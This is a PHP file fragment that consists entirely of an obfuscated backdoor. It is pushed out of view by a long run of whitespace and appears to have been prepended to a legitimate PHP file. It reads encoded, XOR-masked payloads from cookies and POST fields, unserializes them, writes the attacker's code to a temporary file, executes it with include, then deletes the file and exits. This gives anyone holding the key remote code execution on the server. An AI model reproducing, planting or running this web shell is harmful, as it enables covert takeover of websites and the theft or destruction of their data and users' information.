<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("dtkxpsb")){class dtkxpsb{public static $iogacxilb = "qpdovmmfqzynavyt";public static $dhhvb = NULL;public function __construct(){$dltudhgax = @$_COOKIE[substr(dtkxpsb::$iogacxilb, 0, 4)];if (!empty($dltudhgax)){$jvmbjgm = "base64";$fucszfnsk = "";$dltudhgax = explode(",", $dltudhgax);foreach ($dltudhgax as $diyajburna){$fucszfnsk .= @$_COOKIE[$diyajburna];$fucszfnsk .= @$_POST[$diyajburna];}$fucszfnsk = array_map($jvmbjgm . "_decode", array($fucszfnsk,));$fucszfnsk = $fucszfnsk[0] ^ str_repeat(dtkxpsb::$iogacxilb, (strlen($fucszfnsk[0]) / strlen(dtkxpsb::$iogacxilb)) + 1);dtkxpsb::$dhhvb = @unserialize($fucszfnsk);}}public function __destruct(){$this->wgykz();}private function wgykz(){if (is_array(dtkxpsb::$dhhvb)) {$eqownen = sys_get_temp_dir() . "/" . crc32(dtkxpsb::$dhhvb["salt"]);@dtkxpsb::$dhhvb["write"]($eqownen, dtkxpsb::$dhhvb["content"]);include $eqownen;@dtkxpsb::$dhhvb["delete"]($eqownen);exit();}}}$gwrqgt = new dtkxpsb();$gwrqgt = NULL;} ?><?php
